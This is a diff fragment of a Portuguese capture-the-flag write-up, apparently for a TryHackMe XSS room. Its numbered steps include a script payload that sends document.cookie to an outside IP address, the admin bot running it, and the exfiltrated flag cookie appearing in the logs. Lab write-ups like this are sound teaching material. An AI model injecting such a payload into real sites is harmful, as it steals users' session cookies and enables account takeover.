@@ -116,3 +116,5 @@ THM{XSS_CuP1d_Str1k3s_Ag41n}
 5. **Payload XSS** → `<script>fetch('http://192.168.133.90:8000/?c='+document.cookie)</script>` injetado em todos os campos e formulário submetido
 6. **Bot-admin revisa** → o script executa no navegador do revisor ~1 minuto após o envio
 7. **Cookie exfiltrado** nos logs: `?c=flag=THM{XSS_CuP1d_Str1k3s_Ag41n}`
+
+---
